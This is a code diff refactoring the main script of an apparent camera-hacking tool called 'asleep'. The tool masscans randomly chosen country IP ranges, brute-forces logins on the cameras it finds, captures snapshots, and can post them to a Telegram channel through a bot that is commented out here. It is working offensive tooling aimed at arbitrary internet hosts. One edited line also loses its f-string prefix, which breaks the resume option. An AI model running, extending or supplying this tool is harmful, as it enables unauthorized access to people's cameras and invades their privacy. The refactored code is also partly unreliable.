@@ -1,23 +1,27 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
-
-import sys, random, requests
-import optparse, platform
+import optparse
+import os
+import platform
+import random
+import requests
 import subprocess
+import sys
 import time
-
-from countrycode import countrycode
-from pyfiglet import Figlet
 from pathlib import Path
 from queue import Queue
 
-from geolocation import IPDenyGeolocationToIP
-from bot import Poster
-from snapshot import *
-from export import *
-from utils import *
-from brute import *
 from colorama import init
+from countrycode import countrycode
+from pyfiglet import Figlet
+
+import config
+import export
+import utils
+from bot import Poster
+from brute import BruteThread
+from geolocation import IPDenyGeolocationToIP
+from snapshot import ScreenshotThread, ImageProcessingThread
 
 
 def get_os_type():
@@ -33,21 +37,23 @@ def get_os_type():
 
 def process_cameras():
     brute_file = config.tmp_masscan_file
-    hosts = masscan_parse(brute_file)
+    hosts = utils.masscan_parse(brute_file)
     ip_count = len(hosts)
-    logging.info("Parsed %s IPs from Masscan output" % ip_count)
+    config.logging.info(f"Parsed {ip_count} IPs from Masscan output")
 
     if not hosts:
         return False
+    if ip_count < config.default_brute_threads:
+        config.default_brute_threads = ip_count
+        config.default_snap_threads = max(1, ip_count - 20)
+        config.default_image_threads = max(1, ip_count - 100)
 
     ips_list_file = config.ips_file % config.start_datetime
-    full_ips_list = os.path.join(config.reports_folder, ips_list_file)
+    full_ips_list = Path(config.reports_folder) / ips_list_file
     with open(full_ips_list, 'w') as file:
         for host in hosts:
             file.write(host[0] + ":" + host[1] + "\n")
-    logging.info('IPs saved to %s' % full_ips_list)
-
-
+    config.logging.info(f'IPs saved to {full_ips_list}')
 
     config.total = len(hosts)
 
@@ -58,17 +64,17 @@ def process_cameras():
 
         for _ in range(config.default_brute_threads):
             brute_worker = BruteThread(brute_queue, screenshot_queue)
-            brute_worker.setDaemon(True)
+            brute_worker.daemon = True
             brute_worker.start()
 
         for _ in range(config.default_snap_threads):
             screenshot_worker = ScreenshotThread(screenshot_queue, image_processing_queue)
-            screenshot_worker.setDaemon(True)
+            screenshot_worker.daemon = True
             screenshot_worker.start()
 
         for _ in range(config.default_image_threads):
             image_processing_worker = ImageProcessingThread(image_processing_queue)
-            image_processing_worker.setDaemon(True)
+            image_processing_worker.daemon = True
             image_processing_worker.start()
 
 
@@ -83,22 +89,19 @@ def process_cameras():
         print('\n')
 
     except Exception as e:
-        logging.error(e)
-        logging.info("Brute process interrupt!")
-        logging.debug(config.working_hosts)
+        config.logging.error(e)
+        config.logging.info("Brute process interrupt!")
+        config.logging.debug(config.working_hosts)
 
-
-
-
-    logging.info('Results: %s devices found, %s bruted' % (len(hosts), len(config.working_hosts)))
-    logging.info('Made total %s snapshots' % (config.snapshots_counts))
+    config.logging.info(f'Results: {len(hosts)} devices found, {len(config.working_hosts)} bruted')
+    config.logging.info(f'Made total {config.snapshots_counts} snapshots')
 
 
 def masscan(filescan, threads, resume):
-    logging.info('Starting scan with masscan on ports %s' % ", ".join(config.global_ports))
+    config.logging.info(f'Starting scan with masscan on ports {", ".join(config.global_ports)}')
     if resume:
-        logging.info('Continue last scan from paused.conf')
-        params = ' --resume paused.conf %s' % config.additional_masscan_params()
+        config.logging.info('Continue last scan from paused.conf')
+        params = ' --resume paused.conf {config.additional_masscan_params()}'
     else:
         params = ' -p %s -iL %s -oL %s --rate=%s %s' % (
             ",".join(config.global_ports), filescan, config.tmp_masscan_file, threads, config.additional_masscan_params())
@@ -107,28 +110,25 @@ def masscan(filescan, threads, resume):
     binary = 'sudo ' + mmasscan_path if get_os_type() == 'nix' else mmasscan_path
 
     try:
-        if sys.platform.startswith('freebsd') \
-                or sys.platform.startswith('linux') \
-                or sys.platform.startswith('darwin'):
-           p = subprocess.Popen(
+        if platform.system() == 'Windows':
+            subprocess.Popen(
+                [mmasscan_path, '-V'],
+                bufsize=10000,
+                stdout=subprocess.PIPE)
+        else:
+            subprocess.Popen(
                 [mmasscan_path, '-V'],
                 bufsize=10000,
                 stdout=subprocess.PIPE,
                 close_fds=True)
-        else:
-             p = subprocess.Popen(
-                  [mmasscan_path, '-V'],
-                  bufsize=10000,
-                  stdout=subprocess.PIPE)
-
     except OSError:
-           logging.error('Please install Masscan or define \
-full path to binary in .config file.')
-           sys.exit(0)
+        config.logging.error(
+            'Please install Masscan or define full path to binary in .config file.')
+        sys.exit(0)
 
     os.system(binary + params)
-    if not os.path.exists(config.tmp_masscan_file):
-        logging.error('Masscan output error, results file %s not found. Try to run Masscan as Administrator (root)' %
+    if not Path(config.tmp_masscan_file).exists():
+        config.logging.error('Masscan output error, results file %s not found. Try to run Masscan as Administrator (root)' %
                       config.tmp_masscan_file)
         sys.exit(0)
 
@@ -189,7 +189,7 @@ flag while setting custom ports!')
             try:
                 range_list = locator.get_random_ranges(max_ips=int(count), day_ranges=True)
             except Exception as e:
-                logging.debug(e)
+                config.logging.debug(e)
                 continue
             total_range += range_list
             slash = ['|', '/', ' ', '-']
@@ -200,7 +200,7 @@ flag while setting custom ports!')
                 total_count += count2
             config.max_ips = total_count
         else:
-             logging.info('Generated %s IPs from %s' % (total_count, list(dict.fromkeys(config.random_countries))))
+             config.logging.info('Generated %s IPs from %s' % (total_count, list(dict.fromkeys(config.random_countries))))
              config.global_country = random.choice(config.random_countries)
              file = open(config.tmp_masscan_file, 'w')
              file.write("\n".join(total_range))
@@ -223,7 +223,7 @@ flag while setting custom ports!')
             count3 = IPDenyGeolocationToIP.get_cidr_count(cidr)
             total_count += count3
 
-        logging.info('Generated %s IPs from %s' % (total_count, config.global_country))
+        config.logging.info('Generated %s IPs from %s' % (total_count, config.global_country))
 
         file = open(config.tmp_masscan_file, 'w')
         file.write("\n".join(range_list))
@@ -237,13 +237,13 @@ flag while setting custom ports!')
         config.custom_brute_file = True
         config.tmp_masscan_file = options.brute_file
 
-    if not os.path.exists(options.brute_file) and options.brute_only:
-        logging.error('File with IPs %s not found. Specify it with -b option or run without brute-only option'
+    if not Path(options.brute_file).exists() and options.brute_only:
+        config.logging.error('File with IPs %s not found. Specify it with -b option or run without brute-only option'
                       % config.tmp_masscan_file)
         sys.exit(0)
 
     if not options.scan_file and not options.brute_only and not options.masscan_resume:
-        logging.error("No target file scan list")
+        config.logging.error("No target file scan list")
         parser.print_help()
         sys.exit(0)
 
@@ -253,42 +253,42 @@ flag while setting custom ports!')
 def main():
     get_os_type()
     f = Figlet(font='slant')
-    print(f.renderText('asleep')) #+ '\n')
-    print('https://t.me/asleep_cg' + '\n')
+    print(f.renderText('asleep'))
+    print('https://t.me/asleep_cg\n')
     options = get_options()
     if options.debug or options.ports:
-        logging.getLogger().setLevel(logging.DEBUG)
+        config.logging.getLogger().setLevel(config.logging.DEBUG)
     else:
-        logging.getLogger().propagate = False
-    setup_credentials(not options.logins_passes)
-    prepare_folders_and_files()
+        config.logging.getLogger().propagate = False
+    utils.setup_credentials(options.logins_passes)
+    utils.prepare_folders_and_files()
     if not options.brute_only:
         masscan(options.scan_file, options.threads, options.masscan_resume)
     process_cameras()
     if not options.no_xml and len(config.working_hosts) > 0:
-        save_xml(config.working_hosts)
-    save_csv()
+        export.save_xml(config.working_hosts)
+    export.save_csv()
     if options.dead_cams:
-        hosts = masscan_parse(config.tmp_masscan_file)
-        dead_cams(hosts)
+        hosts = utils.masscan_parse(config.tmp_masscan_file)
+        export.dead_cams(hosts)
 
     # Configs for Telegram Bot:
     ROOM_ID = '' # Channel ID
     TOKEN = '' # Bot Token
-    SNAPSHOT_DIR = os.path.join(Path.cwd(), config.snapshots_folder)
+    SNAPSHOT_DIR = Path.cwd() / config.snapshots_folder
     """ delete=True removes snapshots after posting """
     #poster = Poster(SNAPSHOT_DIR, TOKEN, ROOM_ID, delete=False) 
     #poster.start()  ### Start posting function
 
-    if os.path.exists(config.snapshots_folder):
+    if Path(config.snapshots_folder).exists():
         c_error = False
         if config.global_country:
-           try:
-               os.rename(config.snapshots_folder, '%s_%s' % (config.global_country, config.start_datetime))
-           except:
-               c_error = True
+            try:
+                Path(config.snapshots_folder).rename(f'{config.global_country}_{config.start_datetime}')
+            except:
+                c_error = True
         elif not config.global_country or c_error:
-             os.rename(config.snapshots_folder, 'Snapshots_%s' % config.start_datetime)
+            Path(config.snapshots_folder).rename(f'Snapshots_{config.start_datetime}')
 
 
 if __name__ == '__main__':
@@ -296,5 +296,5 @@ if __name__ == '__main__':
         main()
     except KeyboardInterrupt:
         print('\n')
-        logging.info('Interrupted by user')
+        config.logging.info('Interrupted by user')
         sys.exit(0)
